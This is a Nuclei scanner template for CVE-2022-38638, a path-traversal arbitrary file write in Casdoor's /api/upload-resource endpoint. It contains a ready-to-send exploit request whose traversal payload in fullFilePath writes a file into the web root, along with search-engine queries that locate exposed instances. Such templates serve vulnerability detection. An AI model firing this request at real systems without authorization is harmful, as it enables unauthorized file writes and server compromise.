id: CVE-2022-38638

info:
  name: Casdoor Arbitrary File Write Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: Casdoor v1.97.3 was discovered to contain an arbitrary file write vulnerability via the fullFilePath parameter at /api/upload-resource.
  impact: |
    Successful exploitation could lead to unauthorized access, data leakage, or system compromise.
  remediation: |
    Apply the vendor-supplied patch or upgrade to a non-vulnerable version.
  reference:
    - https://github.com/casdoor/casdoor/issues/1035
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H
    cvss-score: 9.1
    cve-id: CVE-2022-38638
    cwe-id: CWE-22
    epss-score: 0.00062
    epss-percentile: 0.27994
    cpe: cpe:2.3:a:casbin:casdoor:1.97.3:*:*:*:*:*:*:*
  metadata:
    vendor: casbin
    product: casdoor
    shodan-query: http.title:"Casdoor"
    fofa-query: title="casdoor"
    google-query: intitle:"casdoor"
  tags: intrusive

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/upload-resource?owner=built-in&user=admin&application=app-built-in&tag=custom&parent=provider_storage_local_file_system&fullFilePath=resource%2F%2e%2e%2F%2e%2e%2Fweb%2Fbuild%2Fflag.html&provider=provider_storage_local_file_system"

    headers:
      Host: door.casdoor.com
      Cookie: casdoor_session_id=2fd9ab275d8d65ea296ab327fd92166a
      Content-Length: "192"
      Sec-Ch-Ua: '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"'
      Sec-Ch-Ua-Mobile: "?0"
      User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
      Sec-Ch-Ua-Platform: '"macOS"'
      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryUPAwhIoXMrbemuJM"
      Accept: "*/*"
      Origin: "https://door.casdoor.com"
      Sec-Fetch-Site: "same-origin"
      Sec-Fetch-Mode: "cors"
      Sec-Fetch-Dest: "empty"
      Referer: "https://door.casdoor.com/resources"
      Accept-Encoding: "gzip, deflate"
      Accept-Language: "zh-CN,zh;q=0.9"
      Connection: "close"

    body: |
      ------WebKitFormBoundaryUPAwhIoXMrbemuJM
      Content-Disposition: form-data; name="file"; filename="spider.png"
      Content-Type: image/png

      I'm here.
      ------WebKitFormBoundaryUPAwhIoXMrbemuJM--
    matchers:
      - type: status
        status:
          - 200
